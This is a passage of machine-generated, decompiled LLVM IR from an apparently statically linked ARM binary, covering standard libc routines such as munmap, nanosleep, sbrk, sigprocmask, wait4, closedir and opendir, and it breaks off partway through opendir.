  br i1 %tmp, label %dec_label_pc_11db0, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %entry
  %v0_11d9c = call i32 @__aeabi_read_tp()
  %v3_11da0 = load i16, i16* @global_var_23164.175, align 2
  %v4_11da0 = sext i16 %v3_11da0 to i32
  %v0_11da4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11da4 = sub i32 0, %v0_11da4
  store i32 %v1_11da4, i32* %r2.global-to-local, align 4
  %v3_11da8 = add i32 %v4_11da0, %v0_11d9c
  %v4_11da8 = inttoptr i32 %v3_11da8 to i32*
  store i32 %v1_11da4, i32* %v4_11da8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11db0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %entry, %dec_label_pc_11d98
  %v1_11db4 = phi i32 [ %v0_11d88, %entry ], [ -1, %dec_label_pc_11d98 ]
  %v2_11db0 = phi i32 [ %v3_11d78, %entry ], [ %v2_11db0.pre, %dec_label_pc_11d98 ]
  store i32 %v2_11db0, i32* @r4, align 4
  ret i32 %v1_11db4

; uselistorder directives
  uselistorder i32 %v0_11d88, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11db0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dbc = load i32, i32* @r7, align 4
  store i32 %v3_11dbc, i32* %stack_var_-8, align 4
  %v0_11dc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11dc8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11dc8, -4095
  br i1 %tmp, label %dec_label_pc_11df0, label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %entry
  %v0_11ddc = call i32 @__aeabi_read_tp()
  %v3_11de0 = load i16, i16* @global_var_23164.175, align 2
  %v4_11de0 = sext i16 %v3_11de0 to i32
  %v0_11de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11de4 = sub i32 0, %v0_11de4
  store i32 %v1_11de4, i32* %r2.global-to-local, align 4
  %v3_11de8 = add i32 %v4_11de0, %v0_11ddc
  %v4_11de8 = inttoptr i32 %v3_11de8 to i32*
  store i32 %v1_11de4, i32* %v4_11de8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11df0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11df0

dec_label_pc_11df0:                               ; preds = %entry, %dec_label_pc_11dd8
  %v1_11df4 = phi i32 [ %v0_11dc8, %entry ], [ -1, %dec_label_pc_11dd8 ]
  %v2_11df0 = phi i32 [ %v3_11dbc, %entry ], [ %v2_11df0.pre, %dec_label_pc_11dd8 ]
  store i32 %v2_11df0, i32* @r7, align 4
  ret i32 %v1_11df4

; uselistorder directives
  uselistorder i32 %v0_11dc8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11df0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dfc = load i32, i32* @r7, align 4
  store i32 %v3_11dfc, i32* %stack_var_-8, align 4
  %v0_11e08 = load i32, i32* @r0, align 4
  store i32 %v0_11e08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e08, -4095
  br i1 %tmp, label %dec_label_pc_11e30, label %dec_label_pc_11e18

dec_label_pc_11e18:                               ; preds = %entry
  %v0_11e1c = call i32 @__aeabi_read_tp()
  %v3_11e20 = load i16, i16* @global_var_23164.175, align 2
  %v4_11e20 = sext i16 %v3_11e20 to i32
  %v0_11e24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e24 = sub i32 0, %v0_11e24
  store i32 %v1_11e24, i32* %r2.global-to-local, align 4
  %v3_11e28 = add i32 %v4_11e20, %v0_11e1c
  %v4_11e28 = inttoptr i32 %v3_11e28 to i32*
  store i32 %v1_11e24, i32* %v4_11e28, align 4
  %v2_11e30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %entry, %dec_label_pc_11e18
  %v1_11e34 = phi i32 [ %v0_11e08, %entry ], [ -1, %dec_label_pc_11e18 ]
  %v2_11e30 = phi i32 [ %v3_11dfc, %entry ], [ %v2_11e30.pre, %dec_label_pc_11e18 ]
  store i32 %v2_11e30, i32* @r7, align 4
  ret i32 %v1_11e34

; uselistorder directives
  uselistorder i32 %v0_11e08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e30, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_11e48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_11e4c = icmp eq i32 %v4_11e48, 0
  %v3_11e50 = load i32, i32* @r4, align 4
  %v9_11e50 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_11e4c, label %dec_label_pc_11e60, label %entry.dec_label_pc_11e68_crit_edge

entry.dec_label_pc_11e68_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11e68

dec_label_pc_11e60:                               ; preds = %entry
  store i32 %v3_11e50, i32* @r4, align 4
  store i32 %v9_11e50, i32* @r6, align 4
  %v0_11e64 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_11e68

dec_label_pc_11e68:                               ; preds = %entry.dec_label_pc_11e68_crit_edge, %dec_label_pc_11e60
  %v0_11e68 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11e68, i32* @r5, align 4
  %v0_11e74 = load i32, i32* @r4, align 4
  store i32 %v0_11e74, i32* @r0, align 4
  %v0_11e78 = call i32 @__syscall_nanosleep()
  store i32 %v0_11e78, i32* @r4, align 4
  %v0_11e80 = load i32, i32* @r5, align 4
  %v1_11e84 = call i32 @__libc_disable_asynccancel(i32 %v0_11e80)
  %v0_11e88 = load i32, i32* @r4, align 4
  ret i32 %v0_11e88

; uselistorder directives
  uselistorder label %dec_label_pc_11e68, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11e9c = load i32, i32* @r4, align 4
  store i32 %v3_11e9c, i32* %stack_var_-16, align 4
  store i32 13316, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r4.global-to-local, align 4
  %v4_11eac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 13316) to i32*), align 4
  store i32 %v4_11eac, i32* @r3, align 4
  %v2_11eb0 = icmp eq i32 %v4_11eac, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_11eb0, label %dec_label_pc_11ebc, label %dec_label_pc_11ecc

dec_label_pc_11ebc:                               ; preds = %entry
  %v1_11ec0 = call i32 @__GI_brk(i32 0)
  %v1_11ec4 = icmp slt i32 %v1_11ec0, 0
  br i1 %v1_11ec4, label %dec_label_pc_11ef0, label %dec_label_pc_11eccthread-pre-split

dec_label_pc_11eccthread-pre-split:               ; preds = %dec_label_pc_11ebc
  %v0_11ed0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_11ecc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11ecc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11eccthread-pre-split, %entry
  %v1_11ecc = phi i32 [ %v1_11ecc.pre, %dec_label_pc_11eccthread-pre-split ], [ 13316, %entry ]
  %v0_11ecc = phi i32 [ %v0_11ecc.pre, %dec_label_pc_11eccthread-pre-split ], [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ]
  %v1_11ee0 = phi i32 [ %v0_11ed0.pr, %dec_label_pc_11eccthread-pre-split ], [ %arg1, %entry ]
  %v2_11ecc = add i32 %v0_11ecc, %v1_11ecc
  %v3_11ecc = inttoptr i32 %v2_11ecc to i32*
  %v4_11ecc = load i32, i32* %v3_11ecc, align 4
  %v2_11ed0 = icmp eq i32 %v1_11ee0, 0
  store i32 %v4_11ecc, i32* %r4.global-to-local, align 4
  br i1 %v2_11ed0, label %dec_label_pc_11ef4, label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11ecc
  %v2_11ee0 = add i32 %v4_11ecc, %v1_11ee0
  %v1_11ee4 = call i32 @__GI_brk(i32 %v2_11ee0)
  %v1_11ee8 = icmp slt i32 %v1_11ee4, 0
  br i1 %v1_11ee8, label %dec_label_pc_11ef0, label %dec_label_pc_11edc.dec_label_pc_11ef4_crit_edge

dec_label_pc_11edc.dec_label_pc_11ef4_crit_edge:  ; preds = %dec_label_pc_11edc
  %v0_11ef4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ef4

dec_label_pc_11ef0:                               ; preds = %dec_label_pc_11edc, %dec_label_pc_11ebc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ecc, %dec_label_pc_11edc.dec_label_pc_11ef4_crit_edge, %dec_label_pc_11ef0
  %v0_11ef4 = phi i32 [ %v0_11ef4.pre, %dec_label_pc_11edc.dec_label_pc_11ef4_crit_edge ], [ -1, %dec_label_pc_11ef0 ], [ %v4_11ecc, %dec_label_pc_11ecc ]
  %v2_11ef8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11ef8, i32* @r4, align 4
  ret i32 %v0_11ef4

; uselistorder directives
  uselistorder i32 %v4_11ecc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_11ef4, { 2, 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11f0c = icmp eq i32* %arg2, null
  br i1 %v2_11f0c, label %dec_label_pc_11f50, label %dec_label_pc_11f20

dec_label_pc_11f20:                               ; preds = %entry
  %v2_11f20 = load i32, i32* %arg2, align 4
  %v1_11f24 = icmp slt i32 %v2_11f20, 0
  br i1 %v1_11f24, label %dec_label_pc_11f38, label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f20
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11f2c = load i32, i32* %.pre3, align 4
  %v1_11f30 = urem i32 %v3_11f2c, 2
  %v2_11f30 = icmp eq i32 %v1_11f30, 0
  br i1 %v2_11f30, label %dec_label_pc_11f50, label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f20, %dec_label_pc_11f2c
  %v2_11f38 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_11f38 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f2c, %entry, %dec_label_pc_11f38
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_11f84, label %dec_label_pc_11f6c

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f50
  %v1_11f70 = sub i32 0, %arg1
  %v3_11f74 = load i16, i16* @global_var_23164.175, align 2
  %v4_11f74 = sext i16 %v3_11f74 to i32
  %v0_11f78 = call i32 @__aeabi_read_tp()
  %v3_11f7c = add i32 %v4_11f74, %v0_11f78
  %v4_11f7c = inttoptr i32 %v3_11f7c to i32*
  store i32 %v1_11f70, i32* %v4_11f7c, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f50, %dec_label_pc_11f6c
  %v1_11f8c = phi i32 [ %arg1, %dec_label_pc_11f50 ], [ -1, %dec_label_pc_11f6c ]
  ret i32 %v1_11f8c

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11f84, { 1, 0 }
  uselistorder label %dec_label_pc_11f50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f38, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11fc0, label %dec_label_pc_11fa8

dec_label_pc_11fa8:                               ; preds = %entry
  %v1_11fac = sub i32 0, %arg1
  %v3_11fb0 = load i16, i16* @global_var_23164.175, align 2
  %v4_11fb0 = sext i16 %v3_11fb0 to i32
  %v0_11fb4 = call i32 @__aeabi_read_tp()
  %v3_11fb8 = add i32 %v4_11fb0, %v0_11fb4
  %v4_11fb8 = inttoptr i32 %v3_11fb8 to i32*
  store i32 %v1_11fac, i32* %v4_11fb8, align 4
  br label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %entry, %dec_label_pc_11fa8
  %v1_11fc4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11fa8 ]
  ret i32 %v1_11fc4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fc0, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_11fd0 = load i32, i32* %arg1, align 4
  store i32 %v2_11fd0, i32* %r3.global-to-local, align 4
  %v3_11fd8 = icmp eq i32 %v2_11fd0, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  br i1 %v3_11fd8, label %dec_label_pc_11fec, label %dec_label_pc_12008

dec_label_pc_11fec:                               ; preds = %entry
  store i32 69992, i32* %r2.global-to-local, align 4
  %v0_11ff0 = call i32 @__aeabi_read_tp()
  %v3_11ff4 = load i16, i16* @global_var_23164.175, align 2
  %v4_11ff4 = sext i16 %v3_11ff4 to i32
  store i32 %v4_11ff4, i32* %r2.global-to-local, align 4
  %v0_11ff8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11ff8, i32* %r1.global-to-local, align 4
  %v1_11ffc = add i32 %v0_11ff8, 10
  store i32 %v1_11ffc, i32* %r3.global-to-local, align 4
  %v3_12000 = add i32 %v4_11ff4, %v0_11ff0
  %v4_12000 = inttoptr i32 %v3_12000 to i32*
  store i32 %v1_11ffc, i32* %v4_12000, align 4
  %v0_120b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_120b0

dec_label_pc_12008:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v1_1200c = add i32 %tmp, 24
  store i32 %v1_1200c, i32* %r2.global-to-local, align 4
  %v4_12014 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 72) to i32*), align 4
  store i32 %v4_12014, i32* %r1.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_12020 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12020)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12038 = load i32, i32* @r6, align 4
  %v2_12038 = add i32 %v0_12038, 16
  %v3_12038 = inttoptr i32 %v2_12038 to i32*
  %v4_12038 = load i32, i32* %v3_12038, align 4
  call void @__pseudo_branch(i32 %v4_12038)
  %v0_12044 = load i32, i32* @r7, align 4
  %v1_12044 = inttoptr i32 %v0_12044 to i32*
  %v2_12044 = load i32, i32* %v1_12044, align 4
  store i32 %v2_12044, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_12054 = load i32, i32* @r8, align 4
  store i32 %v0_12054, i32* %v1_12044, align 4
  %v0_12058 = load i32, i32* @r6, align 4
  %v1_12058 = load i32, i32* %r3.global-to-local, align 4
  %v2_12058 = add i32 %v1_12058, %v0_12058
  %v3_12058 = inttoptr i32 %v2_12058 to i32*
  %v4_12058 = load i32, i32* %v3_12058, align 4
  store i32 ptrtoint (i32* @global_var_12064.519 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12058)
  %v0_12064 = load i32, i32* @r7, align 4
  %v1_12064 = add i32 %v0_12064, 12
  %v2_12064 = inttoptr i32 %v1_12064 to i32*
  %v3_12064 = load i32, i32* %v2_12064, align 4
  store i32 %v3_12064, i32* @r0, align 4
  %v0_12068 = call i32 @free()
  %v0_1206c = load i32, i32* @r7, align 4
  store i32 %v0_1206c, i32* @r0, align 4
  %v0_12070 = call i32 @free()
  %v0_12078 = load i32, i32* @r4, align 4
  store i32 %v0_12078, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_12078, -4095
  br i1 %tmp11, label %dec_label_pc_120ac, label %dec_label_pc_12094

dec_label_pc_12094:                               ; preds = %dec_label_pc_12008
  store i32 69824, i32* %r3.global-to-local, align 4
  %v0_12098 = call i32 @__aeabi_read_tp()
  %v3_1209c = load i16, i16* @global_var_23164.175, align 2
  %v4_1209c = sext i16 %v3_1209c to i32
  store i32 %v4_1209c, i32* %r3.global-to-local, align 4
  %v0_120a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_120a0 = sub i32 0, %v0_120a0
  store i32 %v1_120a0, i32* %r2.global-to-local, align 4
  %v3_120a4 = add i32 %v4_1209c, %v0_12098
  %v4_120a4 = inttoptr i32 %v3_120a4 to i32*
  store i32 %v1_120a0, i32* %v4_120a4, align 4
  %v0_120a8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_120ac

dec_label_pc_120ac:                               ; preds = %dec_label_pc_12008, %dec_label_pc_12094
  %v0_120ac = phi i32 [ %v0_12078, %dec_label_pc_12008 ], [ %v0_120a8, %dec_label_pc_12094 ]
  store i32 %v0_120ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %dec_label_pc_11fec, %dec_label_pc_120ac
  %v0_120b0 = phi i32 [ %v0_120b0.pre, %dec_label_pc_11fec ], [ %v0_120ac, %dec_label_pc_120ac ]
  ret i32 %v0_120b0

; uselistorder directives
  uselistorder i32 %v0_12078, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120b0, { 1, 0 }
  uselistorder label %dec_label_pc_120ac, { 1, 0 }
}

define i32 @function_120c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_120c8:
  %v0_120c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_120c8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_120c8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_120c8, %bb
  %v7_120d8 = phi i32 [ %arg1, %dec_label_pc_120c8 ], [ 0, %bb ]
  ret i32 %v7_120d8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_120dc = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_120f0 = call i32 @malloc(i32 48)
  %v2_120f8 = icmp eq i32 %v1_120f0, 0
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  br i1 %v2_120f8, label %bb, label %dec_label_pc_12108

bb:                                               ; preds = %entry
  br label %dec_label_pc_12194

dec_label_pc_12108:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1210c = load i32, i32* @r4, align 4
  %v2_1210c = icmp ugt i32 %v0_1210c, 511
  %v2_12110 = add i32 %v1_120f0, 4
  %v3_12110 = inttoptr i32 %v2_12110 to i32*
  store i32 0, i32* %v3_12110, align 4
  %v0_12114 = load i32, i32* %r3.global-to-local, align 4
  %v2_12114 = add i32 %v1_120f0, 16
  %v3_12114 = inttoptr i32 %v2_12114 to i32*
  store i32 %v0_12114, i32* %v3_12114, align 4
  %v0_12118 = load i32, i32* %r3.global-to-local, align 4
  %v2_12118 = add i32 %v1_120f0, 8
  %v3_12118 = inttoptr i32 %v2_12118 to i32*
  store i32 %v0_12118, i32* %v3_12118, align 4
  br i1 %v2_1210c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_12108
  %v0_121202 = load i32, i32* @r4, align 4
  %v2_121203 = add i32 %v1_120f0, 20
  %v3_121204 = inttoptr i32 %v2_121203 to i32*
  store i32 %v0_121202, i32* %v3_121204, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_12108
  %v1_1211c = load i32, i32* %r3.global-to-local, align 4
  %v2_1211c = add i32 %v1_1211c, 512
  store i32 %v2_1211c, i32* %r3.global-to-local, align 4
  %v0_12120 = load i32, i32* @r4, align 4
  %v2_12120 = add i32 %v1_120f0, 20
  %v3_12120 = inttoptr i32 %v2_12120 to i32*
  store i32 %v0_12120, i32* %v3_12120, align 4
  %v1_12124 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_12124, i32* %v3_12120, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_120f0, i32* @r5, align 4
  %v0_1212c = load i32, i32* @r7, align 4
  %v2_1212c = inttoptr i32 %v1_120f0 to i32*
  store i32 %v0_1212c, i32* %v2_1212c, align 4
  %v0_12130 = load i32, i32* @r5, align 4
  %v1_12130 = add i32 %v0_12130, 20
  %v2_12130 = inttoptr i32 %v1_12130 to i32*
  %v3_12130 = load i32, i32* %v2_12130, align 4
  store i32 %v3_12130, i32* %r1.global-to-local, align 4
  %v2_12138 = call i32 @calloc(i32 1, i32 %v3_12130)
  %v2_1213c = icmp eq i32 %v2_12138, 0
  store i32 %v2_12138, i32* @r4, align 4
  %v1_12144 = load i32, i32* @r5, align 4
  %v2_12144 = add i32 %v1_12144, 12
  %v3_12144 = inttoptr i32 %v2_12144 to i32*
  store i32 %v2_12138, i32* %v3_12144, align 4
  br i1 %v2_1213c, label %dec_label_pc_1214c, label %dec_label_pc_1215c

dec_label_pc_1214c:                               ; preds = %bb17
  %v0_1214c = load i32, i32* @r5, align 4
  store i32 %v0_1214c, i32* @r0, align 4
  %v0_12150 = call i32 @free()
  %v0_12154 = load i32, i32* @r4, align 4
  br label %dec_label_pc_12194

dec_label_pc_1215c:                               ; preds = %bb17
  %v0_12160 = load i32, i32* @r6, align 4
  %v2_12160 = add i32 %v0_12160, -33364
  store i32 %v2_12160, i32* %r3.global-to-local, align 4
  %v1_12168 = inttoptr i32 %v2_12160 to i32*
  %v2_12168 = load i32, i32* %v1_12168, align 4
  %v3_12168 = add i32 %v0_12160, -33360
  %v4_12168 = inttoptr i32 %v3_12168 to i32*
  %v5_12168 = load i32, i32* %v4_12168, align 4
  store i32 %v5_12168, i32* %r1.global-to-local, align 4
  %v6_12168 = add i32 %v0_12160, -33356
  %v7_12168 = inttoptr i32 %v6_12168 to i32*
  %v8_12168 = load i32, i32* %v7_12168, align 4
  store i32 %v8_12168, i32* %r2.global-to-local, align 4
  %v9_12168 = add i32 %v0_12160, -33352
  %v10_12168 = inttoptr i32 %v9_12168 to i32*
  %v11_12168 = load i32, i32* %v10_12168, align 4
  store i32 %v11_12168, i32* %r3.global-to-local, align 4
  %v12_12168 = add i32 %v0_12160, -33348
  %v1_12174 = inttoptr i32 %v12_12168 to i32*
  %v2_12174 = load i32, i32* %v1_12174, align 4
  %v3_12174 = add i32 %v0_12160, -33344
  %v4_12174 = inttoptr i32 %v3_12174 to i32*
  %v5_12174 = load i32, i32* %v4_12174, align 4
  store i32 %v2_12174, i32* %stack_var_-32, align 4
  store i32 %v5_12168, i32* %r1.global-to-local, align 4
  store i32 %v8_12168, i32* %r2.global-to-local, align 4
  store i32 %v11_12168, i32* %r3.global-to-local, align 4
  %v0_12184 = load i32, i32* @r5, align 4
  %v1_12184 = add i32 %v0_12184, 24
  %v1_12188 = inttoptr i32 %v1_12184 to i32*
  store i32 %v2_12168, i32* %v1_12188, align 4
  %v3_12188 = add i32 %v0_12184, 28
  %v4_12188 = inttoptr i32 %v3_12188 to i32*
  %v5_12188 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12188, i32* %v4_12188, align 4
  %v6_12188 = add i32 %v0_12184, 32
  %v7_12188 = inttoptr i32 %v6_12188 to i32*
  %v8_12188 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_12188, i32* %v7_12188, align 4
  %v9_12188 = add i32 %v0_12184, 36
  %v10_12188 = inttoptr i32 %v9_12188 to i32*
  %v11_12188 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_12188, i32* %v10_12188, align 4
  %v12_12188 = add i32 %v0_12184, 40
  %v2_1218c = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_12174, i32* %r1.global-to-local, align 4
  %v1_12190 = inttoptr i32 %v12_12188 to i32*
  store i32 %v2_1218c, i32* %v1_12190, align 4
  %v3_12190 = add i32 %v0_12184, 44
  %v4_12190 = inttoptr i32 %v3_12190 to i32*
  %v5_12190 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12190, i32* %v4_12190, align 4
  %v0_12194.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %bb, %dec_label_pc_1214c, %dec_label_pc_1215c
  %v0_12194 = phi i32 [ 0, %bb ], [ %v0_12154, %dec_label_pc_1214c ], [ %v0_12194.pre, %dec_label_pc_1215c ]
  store i32 %v12_120dc, i32* @r7, align 4
  ret i32 %v0_12194

; uselistorder directives
  uselistorder i32 %v2_12138, { 1, 0, 2 }
  uselistorder i32 %v1_120f0, { 2, 1, 5, 0, 6, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12194, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_121b4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_121e4, label %dec_label_pc_121cc

dec_label_pc_121cc:                               ; preds = %entry
  %v0_121d0 = call i32 @__aeabi_read_tp()
  %v3_121d4 = load i16, i16* @global_var_23164.175, align 2
  %v4_121d4 = sext i16 %v3_121d4 to i32
  %v0_121d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_121d8 = sub i32 0, %v0_121d8
  store i32 %v1_121d8, i32* %r2.global-to-local, align 4
  %v3_121dc = add i32 %v4_121d4, %v0_121d0
  %v4_121dc = inttoptr i32 %v3_121dc to i32*
  store i32 %v1_121d8, i32* %v4_121dc, align 4
  br label %dec_label_pc_12208

dec_label_pc_121e4:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_121e4 = icmp slt i32 %arg1, 0
  br i1 %v1_121e4, label %dec_label_pc_12208, label %dec_label_pc_121ec

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121e4
  store i32 %v2_121b4, i32* @r1, align 4
  %v0_121f0 = call i32 @fstat()
  %v1_121f4 = icmp slt i32 %v0_121f0, 0
  br i1 %v1_121f4, label %dec_label_pc_121fc, label %dec_label_pc_12210

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121ec
  br label %dec_label_pc_12208

dec_label_pc_12208:                               ; preds = %dec_label_pc_121fc, %dec_label_pc_121e4, %dec_label_pc_121cc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12254

dec_label_pc_12210:                               ; preds = %dec_label_pc_121ec
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_12218 = load i32, i32* @r7, align 4
  %v3_1221c = call i32 @__GI___fcntl_nocancel(i32 %v0_12218, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12224 = load i32, i32* @r7, align 4
  %v2_12228 = call i32 @fd_to_DIR(i32 %v0_12224, i32 %tmp)
  store i32 %v2_12228, i32* %r1.global-to-local, align 4
  %v2_1222c = icmp eq i32 %v2_12228, 0
  br i1 %v2_1222c, label %dec_label_pc_12234, label %dec_label_pc_12254

dec_label_pc_12234:                               ; preds = %dec_label_pc_12210
  %v0_12244 = call i32 @__aeabi_read_tp()
